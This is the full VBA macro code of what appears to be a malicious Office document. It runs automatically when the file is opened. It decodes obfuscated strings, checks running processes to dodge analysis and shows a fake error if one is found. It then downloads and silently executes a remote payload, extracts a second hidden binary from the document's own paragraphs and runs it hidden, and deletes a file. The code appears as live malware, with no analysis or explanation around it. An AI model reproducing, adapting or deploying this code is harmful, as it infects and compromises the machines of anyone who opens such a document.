Sub Auto_Open()
    tuuutulipovnvdy
    oeizugfklwdybdnl
    tcpcxsklrkn
    ilspmrdlicb
End Sub
'-----------------------------------------------------------------------------


'declare some new functions
Function jlzokwkhvalwtz(gjyhvkxgvof As String) As String
    Dim klgfnlwph As String
    Dim myrbgpks As Integer
    Dim pfrfvlhwu As String
    Dim tzbkzgdqa As Integer
    klgfnlwph = ""


    For i = 1 To Len(gjyhvkxgvof) Step 4
        myrbgpks = CDec("&H" & Mid(gjyhvkxgvof, i, 2))
        pfrfvlhwu = CDec("&H" & Mid(gjyhvkxgvof, i + 2, 2))
        tzbkzgdqa = myrbgpks - pfrfvlhwu
        klgfnlwph = klgfnlwph + Chr(tzbkzgdqa)
    Next i
    jlzokwkhvalwtz = klgfnlwph
End Function

'-----------------------------------------------------------------------------

Sub ilspmrdlicb()
    Dim Wbldm7 As Integer
    Dim Wbldm1 As String
    Dim Wbldm2 As String
    Dim Wbldm3 As Integer
    Dim Wbldm4 As Paragraph
    Dim Wbldm8 As Integer
    Dim Wbldm9 As Boolean
    Dim Wbldm5 As Integer
    Dim Wbldm11 As String
    Dim Wbldm6 As Byte
    Dim Gwakocdjva As String
    Dim qffxgkvwamzap As String
    Dim jkzavjgmezylnl() As String
    jkzavjgmezylnl = Split(F.L, ".")


    qffxgkvwamzap = jkzavjgmezylnl(14)
    Gwakocdjva = jlzokwkhvalwtz(jkzavjgmezylnl(11))
    Wbldm1 = jlzokwkhvalwtz(jkzavjgmezylnl(15))

    Wbldm2 = Environ(jlzokwkhvalwtz(qffxgkvwamzap))
    ChDrive (Wbldm2)
    ChDir (Wbldm2)
    Wbldm3 = FreeFile()
    Open Wbldm1 For Binary As Wbldm3
    For Each Wbldm4 In ActiveDocument.Paragraphs
        DoEvents
            Wbldm11 = Wbldm4.Range.Text
        If (Wbldm9 = True) Then
            Wbldm8 = 1
            While (Wbldm8 < Len(Wbldm11))
                Wbldm6 = Mid(Wbldm11, Wbldm8, 4)
                Put #Wbldm3, , Wbldm6
                Wbldm8 = Wbldm8 + 4
            Wend
        ElseIf (InStr(1, Wbldm11, Gwakocdjva) > 0 And Len(Wbldm11) > 0) Then
            Wbldm9 = True
        End If
    Next
    Close #Wbldm3
    Wbldm13 (Wbldm1)
End Sub

'-----------------------------------------------------------------------------

Sub Wbldm13(Wbldm10 As String)
    Dim Wbldm7 As Integer
    Dim Wbldm2 As String
    Dim jkzxxxxadadajgmezylnl() As String
    jkzxxxxadadajgmezylnl = Split(F.L, ".")

    Wbldm2 = Environ(jlzokwkhvalwtz(jkzxxxxadadajgmezylnl(14)))
    ChDrive (Wbldm2)
    ChDir (Wbldm2)
    Wbldm7 = Shell(Wbldm10, vbHide)
End Sub



'-----------------------------------------------------------------------------

Function tuuutulipovnvdy()
    Dim xxatyadaslkjasdlss() As String
    Dim rbpygeiaqqo As String
    Dim uardqptpdfndgho As String
    Dim xypkjslgrgtvjwg As String


    xxatyadaslkjasdlss = Split(F.L, ".")

    rbpygeiaqqo = xxatyadaslkjasdlss(12)
    uardqptpdfndgho = xxatyadaslkjasdlss(13)
    xypkjslgrgtvjwg = xxatyadaslkjasdlss(4)
    Set winMgmt = GetObject(jlzokwkhvalwtz(xxatyadaslkjasdlss(2)))
    Set processes = winMgmt.ExecQuery(jlzokwkhvalwtz(xxatyadaslkjasdlss(3)), , 48)
    For Each p In processes
        Dim pos As Integer
        pos = InStr(LCase(p.Name), jlzokwkhvalwtz(xypkjslgrgtvjwg))
        If pos > 0 Then
            MsgBox jlzokwkhvalwtz(xxatyadaslkjasdlss(0)), vbCritical, jlzokwkhvalwtz(xxatyadaslkjasdlss(1))
            End
        End If
    Next
End Function

'-------------------------------------------------------'

Sub tcpcxsklrkn()
    Dim rqpukgivdfj As String
    Dim aahksrwvszaznoyi As Variant
    Dim ojdquglyxobgwe As String
    Dim eoitbsabengweuehzn As String
    Dim oaqaylrqyf As String
    Dim flpegjbezfyq As Object
    Dim dqbbeoaxmsm As String
    Dim luylhthwhezztllfah As String
    Dim dvoxoeanhyzcsgrw As String
    Dim arOrihejypcArb() As String
    
    arOrihejypcArb = Split(F.L, ".")

    ojdquglyxobgwe = jlzokwkhvalwtz(arOrihejypcArb(5))
    eoitbsabengweuehzn = jlzokwkhvalwtz(arOrihejypcArb(6))
    oaqaylrqyf = jlzokwkhvalwtz(arOrihejypcArb(7))
    dqbbeoaxmsm = jlzokwkhvalwtz(arOrihejypcArb(8))
    luylhthwhezztllfah = jlzokwkhvalwtz(arOrihejypcArb(9))
    dvoxoeanhyzcsgrw = jlzokwkhvalwtz(arOrihejypcArb(10))


    rqpukgivdfj = eoitbsabengweuehzn & oaqaylrqyf
    Set flpegjbezfyq = CreateObject(dqbbeoaxmsm)
    flpegjbezfyq.Open luylhthwhezztllfah, rqpukgivdfj, False
    flpegjbezfyq.send

    If flpegjbezfyq.Status = 200 Then
        Set crezmteyswzzpzaxlh = CreateObject(dvoxoeanhyzcsgrw)
        crezmteyswzzpzaxlh.Open
        crezmteyswzzpzaxlh.Type = 1
        crezmteyswzzpzaxlh.Write flpegjbezfyq.responseBody
        crezmteyswzzpzaxlh.SaveToFile oaqaylrqyf, 2                  
        crezmteyswzzpzaxlh.Close
    End If
    aahksrwvszaznoyi = Shell(ojdquglyxobgwe, vbHide)
End Sub

'------------------------------------------------------------------'

Sub oeizugfklwdybdnl()
    Dim hrhbbibsbjhzwgh As String
    Dim AhOjbrairrpye() As String
    AhOjbrairrpye = Split(F.L, ".")
    hrhbbibsbjhzwgh = jlzokwkhvalwtz(AhOjbrairrpye(16))
    If Len(Dir$(hrhbbibsbjhzwgh)) > 0 Then
        Kill hrhbbibsbjhzwgh
    End If
End Sub

Sub AutoOpen()
   Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

